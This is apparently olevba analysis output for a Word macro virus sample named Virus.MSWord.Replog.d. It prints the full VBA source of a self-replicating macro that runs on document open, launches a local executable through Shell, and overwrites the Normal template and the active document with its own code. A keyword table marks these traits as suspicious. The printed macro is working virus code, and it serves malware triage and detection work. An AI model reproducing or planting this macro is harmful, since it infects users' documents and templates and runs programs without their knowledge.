olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Replog.d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Replog.d - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub Document_Open()
On Error Resume Next
Shell "I:\Eudora\Sys\Server.exe"
Set TD = ThisDocument.VBProject.VBComponents(1)
Set ad = ActiveDocument.VBProject.VBComponents(1)
Set nt = NormalTemplate.VBProject.VBComponents(1)
VCode = TD.CodeModule.Lines(1, TD.CodeModule.CountOfLines)
nt.CodeModule.DeleteLines 1, nt.CodeModule.CountOfLines
ad.CodeModule.DeleteLines 1, ad.CodeModule.CountOfLines
nt.CodeModule.InsertLines 1, VCode
ad.CodeModule.InsertLines 1, VCode

Open "I:\Rep.log" For Append As #1
Print #1, "Active on " & Date
Close
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|IOC       |Server.exe          |Executable file name                         |
+----------+--------------------+---------------------------------------------+

